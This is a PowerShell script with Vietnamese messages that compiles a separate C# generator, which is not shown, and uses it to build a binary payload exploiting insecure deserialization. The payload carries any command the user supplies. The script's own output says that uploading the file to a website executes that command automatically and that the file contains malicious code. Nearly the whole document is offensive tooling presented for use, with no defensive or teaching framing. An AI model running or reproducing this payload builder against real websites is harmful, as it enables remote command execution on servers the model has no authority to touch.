# Script PowerShell đơn giản để tạo payload
# Cách dùng: .\TaoPayload.ps1 "whoami"

param(
    [Parameter(Mandatory=$true, Position=0)]
    [string]$Command,
    
    [Parameter(Mandatory=$false)]
    [string]$OutputFile = "payload.bin"
)

Write-Host ""
Write-Host "=== TẠO PAYLOAD KHAI THÁC INSECURE DESERIALIZATION ===" -ForegroundColor Cyan
Write-Host ""

# Kiểm tra file PayloadGenerator.cs
if (-not (Test-Path "PayloadGenerator.cs")) {
    Write-Host "✗ Không tìm thấy file PayloadGenerator.cs!" -ForegroundColor Red
    Write-Host "  Vui lòng đảm bảo bạn đang ở đúng thư mục." -ForegroundColor Yellow
    exit 1
}

# Tìm C# compiler
$cscPath = $null

# Thử .NET Framework 64-bit
if (Test-Path "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe") {
    $cscPath = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
}
# Thử .NET Framework 32-bit
elseif (Test-Path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe") {
    $cscPath = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
}
# Thử .NET SDK
elseif (Get-Command dotnet -ErrorAction SilentlyContinue) {
    Write-Host "Sử dụng .NET SDK..." -ForegroundColor Yellow
    
    # Tạo project tạm
    $tempDir = "TempPayloadGen_$(Get-Random)"
    & dotnet new console -n $tempDir -f net8.0 --force 2>$null | Out-Null
    Copy-Item PayloadGenerator.cs "$tempDir\Program.cs" -Force
    Set-Location $tempDir
    & dotnet build -c Release -q 2>$null | Out-Null
    
    if (Test-Path "bin\Release\net8.0\$tempDir.exe") {
        & "bin\Release\net8.0\$tempDir.exe" $Command $OutputFile
        Set-Location ..
        if (Test-Path $OutputFile) {
            Move-Item $OutputFile "..\$OutputFile" -Force
        }
        Remove-Item -Recurse -Force $tempDir
        exit 0
    } else {
        Set-Location ..
        Remove-Item -Recurse -Force $tempDir -ErrorAction SilentlyContinue
        Write-Host "✗ Không thể compile với dotnet" -ForegroundColor Red
        exit 1
    }
}
else {
    Write-Host "✗ Không tìm thấy C# compiler!" -ForegroundColor Red
    Write-Host ""
    Write-Host "Vui lòng cài đặt một trong các công cụ sau:" -ForegroundColor Yellow
    Write-Host "  1. .NET Framework (có sẵn trên Windows)" -ForegroundColor White
    Write-Host "  2. .NET SDK: https://dotnet.microsoft.com/download" -ForegroundColor White
    exit 1
}

# Compile với csc.exe
Write-Host "Tìm thấy C# compiler: $cscPath" -ForegroundColor Green
Write-Host "Đang compile PayloadGenerator.cs..." -ForegroundColor Yellow

$exeFile = "PayloadGenerator.exe"
& $cscPath PayloadGenerator.cs /out:$exeFile 2>&1 | Out-Null

if (-not (Test-Path $exeFile)) {
    Write-Host "✗ Không thể compile PayloadGenerator.cs" -ForegroundColor Red
    Write-Host "  Vui lòng kiểm tra lại file PayloadGenerator.cs" -ForegroundColor Yellow
    exit 1
}

Write-Host "✓ Compile thành công!" -ForegroundColor Green
Write-Host "Đang tạo payload..." -ForegroundColor Yellow
Write-Host ""

# Chạy PayloadGenerator.exe
& ".\$exeFile" $Command $OutputFile

# Dọn dẹp
if (Test-Path $exeFile) {
    Remove-Item $exeFile -Force -ErrorAction SilentlyContinue
}

# Kiểm tra kết quả
if (Test-Path $OutputFile) {
    $fileSize = (Get-Item $OutputFile).Length
    Write-Host ""
    Write-Host "═══════════════════════════════════════════════════" -ForegroundColor Green
    Write-Host "✓ HOÀN TẤT!" -ForegroundColor Green
    Write-Host "═══════════════════════════════════════════════════" -ForegroundColor Green
    Write-Host "  File payload: $OutputFile" -ForegroundColor White
    Write-Host "  Kích thước: $fileSize bytes" -ForegroundColor White
    Write-Host "  Command: $Command" -ForegroundColor White
    Write-Host ""
    Write-Host "⚠ CẢNH BÁO: File này chứa mã độc!" -ForegroundColor Red
    Write-Host "  Upload file này lên website sẽ thực thi command tự động." -ForegroundColor Yellow
    Write-Host ""
} else {
    Write-Host ""
    Write-Host "✗ Không thể tạo file payload" -ForegroundColor Red
    exit 1
}

